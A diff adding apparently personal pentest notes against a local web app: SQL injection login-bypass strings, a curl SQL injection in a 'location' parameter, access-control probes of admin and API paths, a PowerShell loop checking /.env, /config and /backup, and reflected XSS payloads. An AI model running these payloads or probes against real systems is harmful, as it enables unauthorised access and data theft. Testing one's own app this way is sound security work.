@@ -1,0 +1,58 @@
+admin' --
+admin' #
+admin'/*
+' or 1=1 --
+' or 1=1#
+' or 1=1/*
+' or '1'='1
+' or '1'='1' --
+' or '1'='1'#
+' or 1=1 limit 1 --
+
+
+
+curl "http://192.168.1.6:5280/Room?location=egypy%27%20OR%20%271%27=%271&guests=1"
+
+brocken access controll 
+curl "http://192.168.1.6:5280/admin" -UseBasicParsing
+curl "http://192.168.1.6:5280/Admin" -UseBasicParsing
+curl "http://192.168.1.6:5280/api/users" -UseBasicParsing
+
+
+check if the script is excuted 
+
+curl "http://192.168.1.6:5280/Room?location=<script>alert(1)</script>&guests=1" -UseBasicParsing
+
+
+
+
+@("/admin", "/Admin", "/administrator", "/api/users", "/api/admin", "/config", "/.env", "/backup", "/debug") | ForEach-Object { 
+    $status = (curl "http://192.168.1.6:5280$_" -UseBasicParsing -Method Head -ErrorAction SilentlyContinue).StatusCode
+    if ($status -eq 200) { Write-Host "[ACCESS] $_ returned 200 OK" -ForegroundColor Red } 
+    elseif ($status -eq 403) { Write-Host "[DENIED] $_ returned 403 Forbidden" -ForegroundColor Yellow }
+    else { Write-Host "[SAFE] $_ returned $status" -ForegroundColor Green }
+}
+
+
+
+
+curl "http://192.168.1.6:5280/Room?location=<body onload=alert('XSS')>&guests=1" -UseBasicParsing | Select-Object -ExpandProperty Content | Select-String "onload"
+
+
+curl "http://192.168.1.6:5280/Room?location=<script>alert(1)</script>&guests=1" -UseBasicParsing | Select-Object -ExpandProperty Content | Select-String "<script>alert"
+
+
+
+curl "http://192.168.1.6:5280/Room?location=\"><script>alert(1)</script>&guests=1" -UseBasicParsing | Select-Object -ExpandProperty Content | Select-String "script"
+
+
+
+
+
+
+
+
+
+
+
+
